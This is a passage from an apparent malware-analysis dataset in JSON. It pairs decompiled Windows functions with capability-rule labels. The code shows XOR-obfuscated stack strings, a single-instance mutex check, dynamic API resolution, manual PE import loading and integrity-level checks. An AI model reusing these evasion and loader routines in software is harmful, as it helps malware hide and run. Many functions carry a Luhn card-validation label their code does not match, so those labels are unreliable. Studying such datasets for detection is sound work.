0x46;\n    var_20h._1_1_ = 0x10;\n    var_20h._2_1_ = 0x10;\n    stack0xffffffdf = 0x4258;\n    var_18h = 0x71793242;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x34);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_8h = &var_30h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        iVar6 = lpLibFileName;\n        if (iVar7 != 0xfe7b1c) {\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % var_4h) ^ (iVar11 + iVar5)[&var_30h - iVar5];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x15);\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    uVar10 = var_10h;\n    if (pcVar8 == NULL) {\n        uVar10 = 0;\n    }\n    else {\n        (*pcVar8)(&var_40h);\n        uVar3 = var_36h;\n        uVar2 = var_36h & 0xffffff;\n        var_36h = uVar2 | uVar10 << 0x18;\n        uVar9 = 0;\n        uVar1 = uVar10 & 0xff;\n        do {\n            if ((uVar1 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar2 << 0x18) == (&var_60h)[uVar9]) {\n                uVar10 = 1;\n            }\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 8);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*pcVar8)(uVar4);\n    return uVar10;\n}\n",
        "token_count": 1331
    },
    "0040c2a2": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "terminate process",
            "create mutex",
            "check mutex and exit"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040c2a2(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_3ch = 0x420e423f;\n    var_38h = 0x421a5242;\n    var_34h = 0x52534202;\n    var_30h = 0x422e4209;\n    var_2ch = 0x4218525e;\n    var_28h = 0x52494219;\n    var_24h = 0x4204423c;\n    var_20h = 0x42025259;\n    var_1ch = 0x5264421f;\n    var_18h = 0x42194204;\n    var_14h = 0x420d5255;\n    var_10h = 0x5230420f;\n    var_ch = 0x426b426c;\n    var_8h._0_2_ = 0x5230;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar4 != 0xe8a16d) {\n            var_4h = 6;\n            *(iVar5 + iVar3) = *(&var_ch + iVar5 % 6) ^ (iVar5 + iVar3)[&var_3ch - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    iVar5 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar3);\n        uVar2 = (*pcVar1)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 657
    },
    "0040cdc7": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040cdc7(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uint var_1bh;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0x21a076e;\n    var_8h = 6;\n    var_20h = 0x39025906;\n    _var_1ch = 0x174a1603;\n    var_1bh._3_1_ = 0x68;\n    var_14h = 0x76686e38;\n    var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x73);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_ch = iVar4;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar5 != 0x30158b) {\n            var_4h = 5;\n            *(iVar7 + iVar4) = *(&var_14h + iVar7 % 5) ^ (iVar7 + iVar4)[&var_24h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    var_24h = 0x3d143d22;\n    var_20h = 0x6a7a3a5c;\n    _var_1ch = 0x3a553748;\n    var_1bh._3_1_ = 0x49;\n    var_14h = 0x53665849;\n    var_10h._0_2_ = 0x5639;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_4h = &var_24h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        iVar5 = var_ch;\n        if (iVar6 != 0xcdeae0) {\n            *(iVar7 + iVar4) = *(&var_14h + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_24h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_ch);\n    (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 807
    },
    "0040d06c": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040d06c(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x41ca90;\n    var_10h = param_1;\n    if (*0x41cdc8 == NULL) {\n        var_48h = 0x7b183a1e;\n        var_44h = 0xe3b0c5f;\n        var_40h = 0x22c072f;\n        var_3ch = 0x7d5d3a00;\n        var_38h = 0xe1f1c13;\n        var_34h = 0x281d3c2d;\n        var_30h = 0x3c3d08;\n        var_2ch._0_2_ = 0x6b23;\n        var_18h = 0x4d6f5549;\n        var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x6b);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_ch = iVar3;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar4 != 0xb482d0) {\n                var_8h = 5;\n                *(iVar7 + iVar3) = *(&var_18h + iVar7 % 5) ^ (iVar7 + iVar3)[&var_48h - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1e);\n        var_28h = 0x3d143d22;\n        var_24h = 0x6a7a3a5c;\n        var_20h = 0x3a553748;\n        var_1ch._0_1_ = 0x49;\n        var_18h = 0x53665849;\n        var_14h._0_2_ = 0x5639;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_8h = &var_28h - iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n            iVar4 = var_ch;\n            if (iVar5 != 0xcdeae0) {\n                var_8h = 6;\n                *(iVar7 + iVar3) = *(&var_18h + iVar7 % 6) ^ (iVar7 + iVar3)[&var_28h - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, var_ch);\n        *0x41cdc8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar1)(0, iVar4);\n        (*pcVar6)(uVar2);\n        pcVar6 = *0x41cdc8;\n        if (*0x41cdc8 == NULL) goto code_r0x0040d1e2;\n    }\n    iVar3 = var_10h;\n    pcVar6 = (**0x41cdc8)(var_10h);\n    if (pcVar6 != '\\0') {\n        *0x41ca90 = iVar3 != 0;\n    }\ncode_r0x0040d1e2:\n    return pcVar6 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1130
    },
    "0040e32d": {
        "rules": [
            "contain obfuscated stackstrings",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040e32d(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint nNumberOfBytesToWrite;\n    int32_t iVar4;\n    code *pcVar5;\n    uint var_80h;\n    uint var_79h;\n    uint var_75h;\n    uint var_71h;\n    uint var_6dh;\n    uint var_69h;\n    uint var_65h;\n    uint var_61h;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_51h;\n    uint var_4dh;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    int32_t hHeap;\n    \n    iVar4 = 8;\n    lpString2 = param_1;\n    hHeap = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, hHeap * 2 + 0x1a);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (iVar2 != 0) {\n            var_8h = iVar2;\n            uVar1 = (*pcVar5)(8, hHeap * 2 + 6);\n            hHeap = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (hHeap != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar2, lpString2);\n                var_14h = fcn.0040e5d6();\n                var_14h = var_14h + 2;\n                var_34h = 0x35246f4a;\n                var_30h = 0x6f417334;\n                var_2ch = 0x7320352a;\n                var_28h = 0x35486f1b;\n                var_24h = 0x35486f6f;\n                var_20h._0_2_ = 0x7341;\n                uVar1 = (*pcVar5)(8, 0x21);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar4 = 0;\n                var_1ch = iVar2;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                    if (iVar3 != 0xf5e454) {\n                        var_10h = 6;\n                        *(iVar4 + iVar2) = *(&var_24h + iVar4 % 6) ^ (iVar4 + iVar2)[&var_34h - iVar2];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0x10);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar5 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_14h, iVar2, uVar1);\n                (*pcVar5)(hHeap, L\"\\\"%s\\\"\", lpString2);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                iVar4 = 8;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n                lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                if (lpString2 != 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_80h._0_2_ = 0x3110;\n                    var_10h = 5;\n                    var_80h._2_1_ = 5;\n                    stack0xffffff7f = 0x65131e3f;\n                    var_79h = 0x5c573f5c;\n                    var_75h = 0x1f605136;\n                    var_71h = 0x7c546051;\n                    var_6dh = 0x547f7b7a;\n                    var_69h = 0x217b7a38;\n                    var_65h = 0x54572114;\n                    var_61h = 0x7d404060;\n                    var_5dh = 0x28512318;\n                    var_59h._0_2_ = 0x180f;\n                    var_59h._2_1_ = 0x36;\n                    var_55h = 0x7454526d;\n                    var_51h._0_2_ = 0x2a51;\n                    var_51h._2_1_ = 0x18;\n                    var_4dh = 0x268512a;\n                    var_49h = 0x28154f7c;\n                    var_45h = 0x5460511b;\n                    var_41h = 0x457b7a7d;\n                    var_24h = 0x4d714571;\n                    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x77);\n                    var_59h._3_1_ = var_80h._2_1_;\n                    var_51h._3_1_ = var_80h._2_1_;\n                    uVar1 = (*pcVar5)(8, 0x44);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar4 = 0;\n                    var_14h = &var_80h - iVar3;\n                    do {\n                        iVar2 = (*_sym.imp.USER32.dll_GetInputState)();\n                        if (iVar2 != 0xbc6e41) {\n                            *(iVar4 + iVar3) = *(&var_24h + iVar4 % var_10h) ^ (iVar4 + iVar3)[&var_80h - iVar3];\n                        }\n                        iVar4 = iVar4 + 1;\n                    } while (iVar4 < 0x43);\n                    uVar1 = var_18h;\n                    nNumberOfBytesToWrite = (*_sym.imp.USER32.dll_wsprintfA)(lpString2, iVar3, var_18h, var_18h);\n                    iVar4 = fcn.0040fa39(nNumberOfBytesToWrite);\n                    iVar2 = var_1ch;\n                    if (iVar4 == 0) {\n                        iVar4 = fcn.0040e180(uVar1);\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpString2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                }\n                uVar1 = (*pcVar5)(0, hHeap);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                iVar2 = var_8h;\n            }\n            uVar1 = (*pcVar5)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 1796
    },
    "00401430": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00401430(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    uint lpUrlComponents;\n    uint var_2ch;\n    uint var_28h;\n    \n    puVar4 = &lpUrlComponents;\n    for (iVar2 = 0x3c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 267
    },
    "0040278c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.0040278c(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x41cac0), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x41cac0));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 114
    },
    "00405945": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405945(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 115
    },
    "00405964": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405964(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00405945();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 352
    },
    "004059ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004059ea(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 254
    },
    "00405a51": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405a51(uint hModule, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    if ((arg_ch == 0) && (arg_ch = arg_10h,  arg_10h == 0)) {\n        uVar1 = 0xc000007b;\n    }\n    else {\n        puVar3 = in_ECX + arg_ch;\n        if (puVar3 == NULL) {\n            uVar1 = 0xc000007b;\n        }\n        else {\n            uVar2 = *puVar3;\n            if (uVar2 != 0) {\n                iVar4 = (in_ECX + arg_10h) - puVar3;\n                do {\n                    if (uVar2 < 0x80000000) {\n                        uVar2 = uVar2 + 2 + in_ECX;\n                    }\n                    else {\n                        uVar2 = uVar2 & 0xffff;\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hModule, uVar2);\n                    *(iVar4 + puVar3) = uVar1;\n                    puVar3 = puVar3 + 1;\n                    uVar2 = *puVar3;\n                } while (uVar2 != 0);\n            }\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 339
    },
    "00405ab9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00405ab9(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpModuleName;\n    uint phModule;\n    \n    iVar2 = *0x41cb50;\n    iVar4 = *(*(*0x41cb50 + 0x3c) + 0x80 + *0x41cb50);\n    if (iVar4 == 0) {\n        uVar3 = 0xc000000d;\n    }\n    else {\n        puVar6 = iVar4 + *0x41cb50;\n        if (puVar6 == NULL) {\n            uVar3 = 0xc000000d;\n        }\n        else {\n            iVar4 = puVar6[3];\n            while (iVar4 != 0) {\n                if (iVar4 + iVar2 != 0) {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar4 + iVar2);\n                    if (iVar4 == 0) break;\n                    lpModuleName._0_1_ = 0;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(iVar4, &lpModuleName, 0x104);\n                    if (iVar5 != 0) {\n                        (*_sym.imp.KERNEL32.dll_GetModuleHandleExA)(1, &lpModuleName, &phModule);\n                    }\n                    iVar4 = fcn.00405a51(iVar4, *puVar6, puVar6[4]);\n                    if (iVar4 != 0) break;\n                }\n                piVar1 = puVar6 + 8;\n                puVar6 = puVar6 + 5;\n                iVar4 = *piVar1;\n            }\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 424
    },
    "004060e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004060e2(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    \n    iVar6 = 0;\n    TokenHandle = param_1;\n    TokenInformationLength = param_1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar1 != 0) {\n        iVar6 = 0;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if ((iVar1 == 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x7a)) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n            puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (puVar3 != NULL) {\n                iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x19, puVar3, TokenInformationLength, &TokenInformationLength);\n                if ((((iVar1 != 0) &&\n                     (puVar4 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*puVar3),  puVar4 != NULL)) &&\n                    (*puVar4 != 0)) &&\n                   (puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*puVar3, *puVar4 - 1),  puVar5 != NULL)) {\n                    if (*puVar5 < 0x2000) {\n                        iVar6 = 1;\n                    }\n                    else {\n                        iVar6 = 3 - (*puVar5 < 0x3000);\n                    }\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return iVar6;\n}\n",
        "token_count": 520
    },
    "0040628d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040628d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_410h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    uVar2 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    do {\n        if (0x3ff < uVar2) {\n            iVar1 = var_8h + uVar2;\n            puVar3 = &var_410h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            uVar2 = 0;\n            var_8h = iVar1;\n            param_1 = var_10h;\n        }\n        *(&var_410h + uVar2) = *(var_ch + param_1) ^ var_1h;\n        uVar2 = uVar2 + 1;\n        var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n        var_ch = var_ch + 1;\n    } while (var_ch < 0x184);\n    if (uVar2 != 0) {\n        puVar3 = &var_410h;\n        puVar4 = var_8h + param_1;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 498
    },
    "00406dde": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00406dde(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_414h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    var_14h = param_2;\n    var_8h = 0;\n    uVar2 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar2) {\n                iVar1 = var_8h + uVar2;\n                puVar3 = &var_414h;\n                puVar4 = var_8h + param_1;\n                for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar2 = 0;\n                var_8h = iVar1;\n                param_1 = var_10h;\n                param_2 = var_14h;\n            }\n            *(&var_414h + uVar2) = *(var_ch + param_1) ^ var_1h;\n            uVar2 = uVar2 + 1;\n            var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n            var_ch = var_ch + 1;\n        } while (var_ch < param_2);\n        if (uVar2 != 0) {\n            puVar3 = &var_414h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 544
    },
    "00407066": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
